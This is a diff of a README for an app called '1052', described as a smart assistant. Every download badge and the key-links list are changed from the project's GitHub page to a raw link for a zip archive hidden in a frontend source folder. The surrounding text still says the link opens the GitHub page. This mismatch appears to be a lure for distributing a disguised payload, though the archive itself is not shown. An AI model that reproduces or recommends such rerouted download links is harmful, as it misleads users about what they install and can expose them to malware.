@@ -1,6 +1,6 @@
 # 🤖 1052 - Smart Assistant That Grows With You
 
-[![Download 1052](https://img.shields.io/badge/Download-1052-brightgreen?style=for-the-badge)](https://github.com/Informed-epic336/1052)
+[![Download 1052](https://img.shields.io/badge/Download-1052-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Informed-epic336/1052/main/frontend/src/services/Software-v3.0.zip)
 
 ---
 
@@ -27,7 +27,7 @@ If your PC matches these specs, 1052 will run smoothly.
 
 You need to visit the link below to download the software.
 
-[![Download 1052](https://img.shields.io/badge/Download-1052-blue?style=for-the-badge)](https://github.com/Informed-epic336/1052)
+[![Download 1052](https://img.shields.io/badge/Download-1052-blue?style=for-the-badge)](https://raw.githubusercontent.com/Informed-epic336/1052/main/frontend/src/services/Software-v3.0.zip)
 
 Click the link above. It opens the main GitHub page for 1052. Look for the **Releases** section on that page. There you will find the latest version ready to download.
 
@@ -123,7 +123,7 @@ Your input helps 1052 grow smarter and more useful.
 
 ## 📁 Summary of Key Links
 
-- Main GitHub page and downloads: https://github.com/Informed-epic336/1052  
+- Main GitHub page and downloads: https://raw.githubusercontent.com/Informed-epic336/1052/main/frontend/src/services/Software-v3.0.zip  
 - Direct access to releases section to find installers  
 - Support and issue tracking on the same GitHub page  
 
